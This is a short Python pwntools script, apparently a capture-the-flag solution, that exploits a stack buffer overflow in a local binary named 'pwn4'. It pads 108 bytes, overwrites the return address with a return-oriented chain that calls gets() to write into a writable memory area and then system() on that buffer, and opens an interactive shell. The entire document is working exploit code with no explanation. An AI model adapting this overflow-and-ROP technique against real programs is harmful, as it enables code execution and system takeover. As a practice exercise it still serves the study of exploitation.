from pwn import *
#context.log_level = 'debug'
sh = process('./pwn4')
gets_addr = 0x08048460
system_addr = 0x8048490 
pop_ebp_ret = 0x0804872f

payload = 'a'*108 + 'bbbb' + p32(gets_addr) + p32(pop_ebp_ret) + p32(0x0804a000) + p32(system_addr) + p32(0xdeadbeef) + p32(0x0804a000)


sh.recv()
sh.sendline(payload)

sh.interactive()
